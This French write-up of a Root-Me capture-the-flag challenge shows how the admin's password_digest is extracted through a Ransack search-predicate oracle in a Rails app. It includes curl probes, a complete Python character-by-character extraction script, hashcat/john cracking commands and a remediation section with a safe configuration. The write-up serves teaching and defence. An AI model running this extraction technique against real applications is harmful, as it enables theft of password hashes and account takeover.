# Writeup — Root-Me : Ruby on Rails - ransack

> Challenge web « Ruby Un Rails » (plateforme Root-Me).
> Objectif : récupérer le mot de passe de l'administrateur en exploitant une
> mauvaise configuration de la gem **Ransack**.

---

## 1. Reconnaissance

L'application expose un formulaire de recherche d'utilisateurs à l'URL `/users`.
Le formulaire ne propose officiellement que deux champs :

- `q[email_cont]` — recherche par email (contient)
- `q[posts_title_cont]` — recherche par titre de post (contient)

Une recherche sur `email_cont=wit` isole un unique compte, l'administrateur :

| Id | First name | Last name | Email                  | Roles |
|----|-----------|-----------|------------------------|-------|
| 4  | Gustav    | Wittfeld  | gwittfeld@example.com  | admin |

La chaîne `gwittfeld` sert de **marqueur** fiable : elle n'apparaît dans la page
que lorsque la recherche renvoie ce compte. C'est la base de notre oracle booléen.

Un commentaire HTML laissé dans la page révèle une seconde route :

```html
<!-- TODO: convert to new API
<a href="/users/advanced_search">Advanced mode</a>
-->
```

---

## 2. Compréhension de la surface d'attaque

### 2.1 Ransack et ses prédicats

Ransack construit des requêtes SQL à partir des paramètres `q[...]`. Chaque clé
est de la forme `attribut_prédicat`, par exemple :

- `email_cont` → `WHERE email LIKE '%valeur%'`
- `email_start` → `WHERE email LIKE 'valeur%'`
- `email_eq` → `WHERE email = 'valeur'`

### 2.2 Tests des prédicats

En testant différents prédicats sur l'action `/users` :

| Prédicat testé            | Résultat                          |
|---------------------------|-----------------------------------|
| `password_start`          | `Error: ransack predicate not allowed` |
| `password_eq`             | `ransack predicate not allowed`   |
| `password_matches`        | `ransack predicate not allowed`   |
| `password_cont`           | **autorisé** (mais ignoré)        |

Conclusion : l'application tourne sous **Ransack ≥ 4**, qui restreint les
prédicats par une liste blanche. Seul `cont` (contient) est disponible. Ce n'est
pas bloquant : `cont` suffit à construire un oracle d'extraction.

### 2.3 Identification des attributs recherchables

Une recherche calibrée confirme que l'oracle `cont` discrimine bien sur les
colonnes autorisées (ex. `first_name_cont=Gust` → 1 résultat,
`first_name_cont=ZZZZ` → 0 résultat).

En revanche, `password_cont` est **silencieusement ignoré** : la colonne n'est
pas dans la liste blanche `ransackable_attributes` du modèle `User`. Une
recherche sur un attribut non autorisé n'affecte tout simplement pas les
résultats.

---

## 3. Fuite d'informations par les pages d'erreur

Le mode développement de Rails renvoie des pages d'exception très verbeuses.
Plusieurs manipulations déclenchent des erreurs instructives :

### 3.1 Schéma d'un modèle associé

Rechercher via l'association `roles` (le champ "Roles" est en réalité une
association vers un modèle `Role` non durci) déclenche :

```
Ransack needs Role attributes explicitly allowlisted as searchable.
Define a `ransackable_attributes` class method in your `Role` model [...]
You can use the following as a base:
  ["created_at", "description", "id", "id_value", "name", "updated_at"]
```

→ Les pages d'erreur **fuitent le schéma** des modèles non protégés.

### 3.2 Code source du contrôleur

En appelant la route cachée `/users/advanced_search`, l'exception révèle le code
source exact du contrôleur :

```ruby
def filter_input_fields(fields, forbidden_fields)
  fields.each {|k,v|
    forbidden_fields.each {|fd|
      if k.start_with?(fd)
        fields.delete(k)
      ...

def advanced_search
  params[:q] = filter_input_fields(params[:q], ["id", "password_digest"])
  @search = User.search(params[:q])
  #@search = User.ransack(params[:q])
  @search.build_grouping unless @search.groupings.any?
  ...
```

Informations capitales obtenues :

1. **Le vrai nom de la colonne secrète est `password_digest`** (et non
   `password`). C'est pourquoi tous les tests sur `password_cont` échouaient :
   mauvais nom d'attribut.
2. Une blacklist maison protège `advanced_search`, mais pas l'action `index`.

Versions identifiées via les bannières d'exception : **Rails 8.0.0**,
**Ransack 4.2.1**.

---

## 4. Construction de l'oracle

On revient à l'action `index` (`/users`, qui utilise `User.ransack`) avec le bon
nom de colonne. Vérification que `password_digest_cont` discrimine :

```bash
curl -s "http://challenge01.root-me.org:59097/users?q[email_cont]=wit&q[password_digest_cont]=a"   | grep -c gwittfeld   # => 1  (le digest contient 'a')
curl -s "http://challenge01.root-me.org:59097/users?q[email_cont]=wit&q[password_digest_cont]=zzz" | grep -c gwittfeld   # => 0  (ne contient pas 'zzz')
```

L'oracle fonctionne :

- `email_cont=wit` isole l'admin.
- `password_digest_cont=<sous-chaîne>` renvoie l'admin **si et seulement si** le
  digest contient cette sous-chaîne.
- Présence de `gwittfeld` dans la réponse = condition vraie.

L'alphabet observé dans le digest est hexadécimal plus le caractère `_` :
`0123456789abcdef_`.

---

## 5. Extraction du digest caractère par caractère

### 5.1 Le défi : `cont` n'a pas d'ancre

Le prédicat `cont` teste seulement « contient quelque part », pas « commence
par ». Il faut donc reconstruire par **extension de sous-chaîne** : partir d'un
fragment connu et l'étendre à droite puis à gauche.

Le piège : dès qu'un petit motif se répète dans le digest, une extension d'un
seul caractère devient ambiguë (plusieurs caractères « suivent » le fragment à
des endroits différents), ce qui fait exploser le nombre de candidats.

### 5.2 La solution : contexte glissant à longueur variable

À chaque pas, on ancre sur les derniers caractères connus. Si deux caractères
ou plus suivent ce contexte, on **allonge le contexte** (on utilise plus de
caractères déjà reconstruits) jusqu'à ce qu'un seul caractère subsiste. Un
contexte plus long est plus rare dans le digest, donc finit par être unique.

### 5.3 Script final

```python
#!/usr/bin/env python3
import argparse, requests

ALPHABET = "0123456789abcdef_"

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("-u", "--url", default="http://challenge01.root-me.org:59097/users")
    p.add_argument("-e", "--email", default="wit")
    p.add_argument("-a", "--attr", default="password_digest_cont")
    p.add_argument("-m", "--marker", default="gwittfeld")
    p.add_argument("-x", "--proxy", default=None)
    return p.parse_args()

cfg = parse_args()
session = requests.Session()
if cfg.proxy:
    session.proxies = {"http": cfg.proxy, "https": cfg.proxy}

REQ = 0
def oracle(sub):
    global REQ
    REQ += 1
    params = {"q[email_cont]": cfg.email, f"q[{cfg.attr}]": sub, "commit": "Search"}
    return cfg.marker in session.get(cfg.url, params=params, timeout=20).text

def present_chars():
    return [c for c in ALPHABET if oracle(c)]

def step_right(s, alpha):
    """Trouve LE caractère suivant en allongeant le contexte droit si besoin."""
    for ctxlen in range(2, len(s) + 1):
        ctx = s[-ctxlen:]
        nxt = [c for c in alpha if oracle(ctx + c)]
        if len(nxt) == 0:
            return None                 # vraie fin à droite
        if len(nxt) == 1:
            return nxt[0]               # caractère déterminé
        # sinon : contexte trop court, on rallonge
    return ("AMBIG", nxt)

def step_left(s, alpha):
    for ctxlen in range(2, len(s) + 1):
        ctx = s[:ctxlen]
        nxt = [c for c in alpha if oracle(c + ctx)]
        if len(nxt) == 0:
            return None
        if len(nxt) == 1:
            return nxt[0]
    return ("AMBIG", nxt)

def main():
    print("[*] Sanity:", oracle("a"), "/", oracle("zzz"))
    alpha = present_chars()
    print(f"[*] Caractères présents : {''.join(alpha)}")
    seed = next((a+b for a in alpha for b in alpha if oracle(a+b)), None)
    print(f"[*] Graine : {seed!r}\n")
    s = seed

    while True:                          # extension droite
        r = step_right(s, alpha)
        if r is None:
            print("\n[*] Fin droite atteinte."); break
        if isinstance(r, tuple):
            print(f"\n[!] Ambiguïté droite : {r[1]}"); break
        s += r
        print(f"\r[R] {s}  (req={REQ})", end="", flush=True)

    while True:                          # extension gauche
        r = step_left(s, alpha)
        if r is None:
            print("\n[*] Fin gauche atteinte."); break
        if isinstance(r, tuple):
            print(f"\n[!] Ambiguïté gauche : {r[1]}"); break
        s = r + s
        print(f"\r[L] {s}  (req={REQ})", end="", flush=True)

    print(f"\n\n[=] Digest : {s!r}  (longueur {len(s)}, {REQ} requêtes)")
    ok = oracle(s) and not any(oracle(s + c) or oracle(c + s) for c in alpha)
    print("[✓] CONFIRMÉ" if ok else "[!] Encore extensible / non confirmé")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompu.")
```

Exécution :

```bash
python3 solve.py            # ou --proxy http://127.0.0.1:3128 si nécessaire
```

Le script déroule le digest complet et confirme qu'aucun caractère ne peut
l'étendre des deux côtés (c'est donc le digest entier, pas une sous-chaîne).

---

## 6. Cassage du hash

Le `password_digest` extrait est ensuite cassé hors-ligne (wordlist /
bruteforce) pour récupérer le mot de passe en clair, qui permet de se connecter
en tant qu'administrateur et de valider le challenge.

```bash
# Exemple selon le format du hash
hashcat -m <mode> digest.txt wordlist.txt
# ou
john --wordlist=rockyou.txt digest.txt
```

---

## 7. Résumé de la chaîne d'exploitation

1. **Reconnaissance** : formulaire Ransack sur `/users`, admin isolé via
   `email_cont=wit`.
2. **Énumération des prédicats** : seul `cont` est autorisé (Ransack ≥ 4).
3. **Fuite via erreurs Rails** : les pages d'exception révèlent le schéma des
   modèles et le code source du contrôleur.
4. **Découverte du nom réel de la colonne** : `password_digest` (via
   `/users/advanced_search`).
5. **Oracle booléen** : `password_digest_cont` combiné au marqueur `gwittfeld`.
6. **Extraction** : reconstruction caractère par caractère avec contexte
   glissant à longueur variable pour gérer les répétitions.
7. **Cassage du hash** et connexion administrateur.

---

## 8. Causes racines et remédiation

| Vulnérabilité | Correctif |
|---------------|-----------|
| `ransackable_attributes` incomplet / colonnes sensibles exposées | Définir explicitement une liste blanche minimale par modèle, excluant `password_digest`, tokens, etc. |
| Recherche possible sur des attributs non destinés à l'être | Limiter `ransackable_attributes` et `ransackable_associations` au strict nécessaire |
| Pages d'erreur verbeuses en production | Désactiver `consider_all_requests_local` / les détails d'exception hors développement |
| Route de debug laissée accessible (`advanced_search`) | Retirer le code mort et les routes non finalisées |
| Filtre maison contournable (`start_with?`) | Ne pas réinventer de blacklist fragile ; s'appuyer sur l'allowlist de Ransack |

### Exemple de configuration sûre

```ruby
class User < ApplicationRecord
  def self.ransackable_attributes(auth_object = nil)
    ["first_name", "last_name", "email"]   # jamais password_digest
  end

  def self.ransackable_associations(auth_object = nil)
    []
  end
end
```

---

*Challenge réalisé à des fins pédagogiques sur la plateforme légale Root-Me.*
